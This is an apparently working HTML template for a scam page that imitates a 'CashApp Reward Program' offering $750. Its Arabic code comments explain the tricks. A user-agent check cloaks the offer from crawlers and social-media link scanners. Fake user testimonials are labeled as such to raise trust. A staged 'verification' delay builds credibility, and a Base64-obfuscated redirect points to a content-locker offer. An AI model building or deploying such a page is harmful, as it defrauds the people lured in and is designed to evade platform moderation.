<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CashApp Reward Program</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --cash-green: #00d632; --dark-bg: #000000; }
        body { font-family: 'Open Sans', sans-serif; background-color: var(--dark-bg); color: white; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* تصميم الهاتف - Mobile First */
        .app-container { width: 100%; max-width: 450px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; box-sizing: border-box; }
        
        .logo { width: 80px; height: 80px; background: var(--cash-green); border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 50px; font-weight: 800; margin-top: 40px; box-shadow: 0 0 20px rgba(0, 214, 50, 0.5); }
        
        h1 { font-size: 26px; text-align: center; margin-top: 30px; line-height: 1.3; }
        .amount { color: var(--cash-green); font-size: 45px; display: block; margin-top: 10px; }

        /* حالة التحقق للروبوتات */
        #verification-box { width: 100%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; margin-top: 30px; text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid var(--cash-green); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* التعليقات "المزيفة" لزيادة الثقة */
        .comments-section { width: 100%; margin-top: 40px; text-align: left; font-size: 13px; border-top: 1px solid #222; padding-top: 20px; }
        .comment { margin-bottom: 15px; display: flex; gap: 10px; }
        .pfp { width: 35px; height: 35px; border-radius: 50%; background: #333; flex-shrink: 0; }
        .c-text { background: #1a1a1a; padding: 10px; border-radius: 10px; flex-grow: 1; }
        .c-name { font-weight: bold; color: var(--cash-green); margin-bottom: 3px; }

        /* زر التحويل */
        .cta-btn { display: none; background: var(--cash-green); color: black; text-decoration: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 800; font-size: 18px; margin-top: 20px; text-transform: uppercase; box-shadow: 0 5px 15px rgba(0, 214, 50, 0.3); }

        #bot-view { display: block; text-align: center; margin-top: 100px; }
    </style>
</head>
<body>

    <div id="bot-view" class="app-container">
        <p>Loading Secure Resource...</p>
        <div class="loader"></div>
    </div>

    <div id="user-view" class="app-container" style="display: none;">
        <div class="logo">$</div>
        <h1>Pending Transfer:<br><span class="amount">$750.00</span></h1>
        
        <div id="verification-box">
            <p id="v-status">Verifying connection...</p>
            <div id="v-loader" class="loader"></div>
            <a href="YOUR_OGADS_LINK" id="main-link" class="cta-btn">Claim to CashApp</a>
        </div>

        <div class="comments-section">
            <div class="comment">
                <div class="pfp" style="background: #4a90e2;"></div>
                <div class="c-text"><div class="c-name">Jessica W.</div>I just got the $750! Thought it was fake but it hit my CashApp in 5 mins. Thanks!</div>
            </div>
            <div class="comment">
                <div class="pfp" style="background: #e24a4a;"></div>
                <div class="c-text"><div class="c-name">Marcus K.</div>Took me 2 minutes to enter my email. Easy money.</div>
            </div>
        </div>
    </div>

    <script>
        // الرابط الخاص بك مشفر (Base64) - استبدله برابط الـ Content Locker أو العرض المباشر
        var _e42 = "aHR0cHM6Ly9mZXJhdmVyb21vbnN0ZXIuaW5rL3NsLzMxcm9q"; 

        function init() {
            var ua = navigator.userAgent.toLowerCase();
            var isBot = /bot|facebookexternalhit|crawler|spider|google/i.test(ua);

            if (!isBot) {
                // إظهار محتوى العرض للبشر فقط
                document.getElementById('bot-view').style.display = 'none';
                document.getElementById('user-view').style.display = 'flex';
                
                // محاكاة الفحص لزيادة الإقناع
                setTimeout(function() {
                    document.getElementById('v-status').innerHTML = "User Verified! Click below to claim:";
                    document.getElementById('v-status').style.color = "#00d632";
                    document.getElementById('v-loader').style.display = "none";
                    
                    var link = atob(_e42);
                    var btn = document.getElementById('main-link');
                    btn.setAttribute('href', link);
                    btn.style.display = "block";
                }, 2500);
            }
        }
        window.onload = init;
    </script>
</body>
</html>
